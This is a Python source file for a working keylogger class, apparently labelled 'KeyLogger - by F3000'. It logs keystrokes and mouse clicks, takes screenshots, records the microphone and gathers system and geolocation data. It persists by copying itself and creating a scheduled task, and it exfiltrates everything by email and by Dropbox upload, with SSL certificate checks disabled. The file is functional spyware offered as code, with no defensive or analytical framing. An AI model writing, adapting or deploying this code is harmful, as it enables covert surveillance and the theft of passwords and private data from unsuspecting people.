import dropbox
import geocoder
import mss
import os
import platform
import socket
import ssl
import time
import wave

# sounddevice depends on PortAudio which may not be present on Windows Server;
# import it conditionally so the rest of the program still runs without audio.
try:
    import sounddevice as sd
    SOUNDDEVICE_AVAILABLE = True
except Exception as _sd_err:
    sd = None
    SOUNDDEVICE_AVAILABLE = False
    print(f"[import] WARNING - sounddevice not available: {_sd_err}")

from pynput import keyboard, mouse
from requests.adapters import HTTPAdapter
from utils import (
    send_mail_with_attachment,
    get_wav_and_png_files,
    delete_wav_and_png_files,
    upload_to_dropbox,
    save_program_in_location,
    create_scheduled_task,
)


class SSLAdapter(HTTPAdapter):
    # Avoid SSL certificate verification
    def init_poolmanager(self, *args, **kwargs):
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        kwargs["ssl_context"] = context
        return super(SSLAdapter, self).init_poolmanager(*args, **kwargs)


class KeyLogger:
    def __init__(
        self,
        time_interval,
        smtp_server,
        smtp_port,
        email_address,
        email_password,
        email_sender,
        email_receiver,
        cc,
        magic_word,
        dropbox_app_key,
        dropbox_app_secret,
        dropbox_refresh_token,
        src_file,
        dest_folder,
        scheduled_task_name,
    ):
        self.interval = time_interval
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port
        self.email_address = email_address
        self.email_password = email_password
        self.email_sender = email_sender
        self.email_receiver = email_receiver
        self.cc = cc
        self.magic_word = magic_word
        self.dropbox_app_key = dropbox_app_key
        self.dropbox_app_secret = dropbox_app_secret
        self.dropbox_refresh_token = dropbox_refresh_token
        self.src_file = src_file
        self.dest_folder = dest_folder
        self.scheduled_task_name = scheduled_task_name

        self.log = "KeyLogger Started...\n"
        self.keyboard_listener = None
        self.mouse_listener = None
        self.word = ""

    def appendlog(self, string):
        if string:
            self.log = self.log + string

    def on_move(self, x, y):
        pass  # do nothing

    def on_scroll(self, x, y, dx, dy):
        pass  # do nothing

    def on_click(self, x, y, button, pressed):
        if pressed:
            current_click = f"\nMouse click at {x} {y} with button {button}"
            self.screenshot()
            self.appendlog(current_click)

    def save_data(self, key):
        current_key = ""
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = "SPACE"
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = f" {str(key)} "

        self.word = self.word + current_key
        self.appendlog(f"\nPressed key: {current_key}")

    def send_mail(self, message):
        try:
            result = send_mail_with_attachment(
                smtp_server=self.smtp_server,
                smtp_port=self.smtp_port,
                email_address=self.email_address,
                email_password=self.email_password,
                email_sender=self.email_sender,
                email_receiver=self.email_receiver,
                cc=self.cc,
                path_to_attachment=self.dest_folder,
                attachments=[],
                subject="KeyLogger - by F3000",
                body=message,
            )
            if not result:
                print("[send_mail] Email sending failed (returned False).")
        except Exception as e:
            print(f"[send_mail] Unexpected error sending email: {e}")

    def report(self):
        # Always attempt to send the email first, regardless of Dropbox status
        self.send_mail(self.log)

        # Dropbox upload
        wav_and_png_files = get_wav_and_png_files(self.dest_folder)
        try:
            # Use refresh token for automatic, long-lived authentication
            dbx = dropbox.Dropbox(
                oauth2_refresh_token=self.dropbox_refresh_token,
                app_key=self.dropbox_app_key,
                app_secret=self.dropbox_app_secret,
            )
            session = dbx._session
            session.mount("https://", SSLAdapter())
            self.appendlog("\n[report] Dropbox connection established.")
        except Exception as e:
            self.appendlog(f"\n[report] ERROR - Could not connect to Dropbox: {e}")
            dbx = None

        if dbx is not None:
            upload_to_dropbox(
                socket.gethostname(), dbx, wav_and_png_files, self.dest_folder
            )

        delete_wav_and_png_files(self.dest_folder)
        print(self.log)

    def cleanup(self):
        self.log = ""

        try:
            if (
                hasattr(self, "keyboard_listener")
                and self.keyboard_listener
                and self.keyboard_listener.running
            ):
                self.keyboard_listener.stop()
                self.keyboard_listener = None
        except Exception as e:
            print(f"[cleanup] Error stopping keyboard listener: {e}")

        try:
            if (
                hasattr(self, "mouse_listener")
                and self.mouse_listener
                and self.mouse_listener.running
            ):
                self.mouse_listener.stop()
                self.mouse_listener = None
        except Exception as e:
            print(f"[cleanup] Error stopping mouse listener: {e}")

        self.word = ""

    def system_information(self):
        self.appendlog("\n--- System info ---")
        try:
            hostname = socket.gethostname()
            self.appendlog(f"\nHostname = {hostname}")
        except Exception as e:
            self.appendlog(f"\n[system_information] ERROR - Hostname: {e}")

        try:
            ip = socket.gethostbyname(socket.gethostname())
            self.appendlog(f"\nIP = {ip}")
        except Exception as e:
            self.appendlog(f"\n[system_information] ERROR - IP: {e}")

        try:
            self.appendlog(f"\nProcessor = {platform.processor()}")
            self.appendlog(f"\nSystem OS = {platform.system()}")
            self.appendlog(f"\nRelease = {platform.release()}")
            self.appendlog(f"\nMachine architecture = {platform.machine()}")
            self.appendlog(f"\nPython version = {platform.python_version()}")
        except Exception as e:
            self.appendlog(f"\n[system_information] ERROR - Platform info: {e}")

        self.appendlog("\n")

    def get_location(self):
        self.appendlog("\n--- Location info ---")
        try:
            location = geocoder.ip("me")
            if location.ok:
                latitude, longitude = location.latlng
                self.appendlog(f"\nGeo position = {latitude} {longitude}")
                self.appendlog(f"\nCity = {location.city}")
                self.appendlog(f"\nState = {location.state}")
                self.appendlog(f"\nCountry = {location.country}")
            else:
                self.appendlog("\nLocation not determined (geocoder returned not ok).")
        except Exception as e:
            self.appendlog(f"\n[get_location] ERROR - Could not retrieve location: {e}")

    def microphone(self):
        if not SOUNDDEVICE_AVAILABLE:
            self.appendlog("\n[microphone] sounddevice not available, skipping.")
            return

        filename = None
        try:
            devices = sd.query_devices()
            input_devices = [d for d in devices if d["max_input_channels"] > 0]
            if not input_devices:
                self.appendlog("\n[microphone] No input audio devices found, skipping.")
                return

            fs = 44100
            channels = 1  # mono
            seconds = self.interval
            filename = os.path.join(self.dest_folder, f"sound_{time.time()}.wav")
            myrecording = sd.rec(
                int(seconds * fs), samplerate=fs, channels=channels, dtype="int16"
            )
            sd.wait()
            with wave.open(filename, "w") as obj:
                obj.setnchannels(channels)
                obj.setsampwidth(2)  # 16-bit
                obj.setframerate(fs)
                obj.writeframesraw(myrecording)
            self.appendlog("\n[microphone] Audio recorded successfully.")
        except Exception as e:
            self.appendlog(f"\n[microphone] ERROR - Could not record audio: {e}")
            # Remove any partial/corrupted wav file created before the error
            if filename and os.path.exists(filename):
                try:
                    os.remove(filename)
                except Exception:
                    pass

    def screenshot(self):
        try:
            if not os.path.exists(self.dest_folder):
                os.makedirs(self.dest_folder, exist_ok=True)
            filename = os.path.join(self.dest_folder, f"screenshot_{time.time()}.png")
            with mss.mss() as sct:
                sct.shot(output=filename)
            self.appendlog("\n[screenshot] Screenshot taken successfully.")
        except Exception as e:
            self.appendlog(f"\n[screenshot] ERROR - Could not take screenshot: {e}")

    def _start_keyboard_listener(self):
        try:
            self.keyboard_listener = keyboard.Listener(on_press=self.save_data)
            self.keyboard_listener.start()
            self.appendlog("\n[listeners] Keyboard listener started.")
        except Exception as e:
            self.appendlog(f"\n[listeners] ERROR - Could not start keyboard listener: {e}")
            self.keyboard_listener = None

    def _start_mouse_listener(self):
        try:
            self.mouse_listener = mouse.Listener(
                on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll
            )
            self.mouse_listener.start()
            self.appendlog("\n[listeners] Mouse listener started.")
        except Exception as e:
            self.appendlog(f"\n[listeners] ERROR - Could not start mouse listener: {e}")
            self.mouse_listener = None

    def run(self):
        # Ensure destination folder exists
        try:
            os.makedirs(self.dest_folder, exist_ok=True)
            self.appendlog(f"\n[run] Destination folder ready: {self.dest_folder}")
        except Exception as e:
            self.appendlog(f"\n[run] ERROR - Could not create destination folder: {e}")

        # Copy executable to destination
        try:
            executable_path = save_program_in_location(self.src_file, self.dest_folder)
            self.appendlog(f"\n[run] Executable saved to: {executable_path}")
        except Exception as e:
            self.appendlog(f"\n[run] ERROR - Could not save executable: {e}")
            executable_path = self.src_file  # fallback to original path

        # Create scheduled task
        try:
            create_scheduled_task(executable_path, self.scheduled_task_name)
            self.appendlog(f"\n[run] Scheduled task '{self.scheduled_task_name}' processed.")
        except Exception as e:
            self.appendlog(f"\n[run] ERROR - Could not create scheduled task: {e}")

        # Gather initial machine info
        self.system_information()
        self.get_location()

        try:
            while True:
                self._start_keyboard_listener()
                self._start_mouse_listener()

                self.screenshot()
                self.microphone()

                time.sleep(self.interval)

                self.report()

                if self.magic_word != "" and self.magic_word in self.word:
                    break

                self.cleanup()

        except Exception as e:
            # Unhandled exception in the main loop: log it and send one final email
            self.appendlog(f"\n[run] FATAL - Unhandled exception in main loop: {e}")
            try:
                self.send_mail(self.log)
            except Exception as mail_err:
                print(f"[run] Could not send crash email: {mail_err}")
        finally:
            self.cleanup()
